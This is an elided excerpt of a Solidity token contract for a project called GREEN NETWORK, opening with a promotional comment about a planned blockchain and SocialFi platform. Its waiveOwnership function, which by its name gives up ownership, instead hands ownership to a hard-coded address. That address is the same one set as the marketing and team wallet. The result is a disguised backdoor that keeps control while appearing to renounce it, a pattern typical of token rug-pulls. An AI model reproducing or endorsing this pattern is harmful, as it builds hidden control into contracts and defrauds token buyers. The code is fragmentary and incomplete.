...
/**
GREEN NETWORK is a social network that will focus on decentralized  greenable ecosystem (DGE) which will 
create its own layer 1 BLOCKCHAIN with a PoS consensus And develop SocialFi using WEB3 technology

Telegram : 
Twitter : https://twitter.com/greennetworkbsc
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x0DB92A082c49598fC817Be75C96867Fe01D07E5f);
    }
...
contract GREENNETWORK is Context, IERC20, Ownable {
    ...
    string private _symbol = "GN NET";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x0DB92A082c49598fC817Be75C96867Fe01D07E5f);
    address payable public teamWalletAddress = payable(0x0DB92A082c49598fC817Be75C96867Fe01D07E5f);
